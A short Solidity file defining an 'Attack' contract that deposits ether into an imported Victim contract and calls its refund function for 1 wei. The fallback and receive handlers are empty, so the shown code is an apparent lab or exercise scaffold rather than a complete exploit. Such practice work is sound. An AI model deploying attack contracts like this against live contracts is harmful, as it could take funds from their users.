pragma solidity ^0.7.0;

import "./victim.sol";

contract Attack {
    Victim public victim;
    address payable public attacker;

    constructor(address _victim) {
        victim = Victim(_victim);
        attacker = payable(msg.sender);
    }
    
    fallback() external payable{

    }

    receive() external payable{

    }

    function attackdeposit() public payable {
        victim.deposit{value : msg.value}();   
    }

    function attackrefund1() public payable{
        victim.refund(1 wei);
    }

}
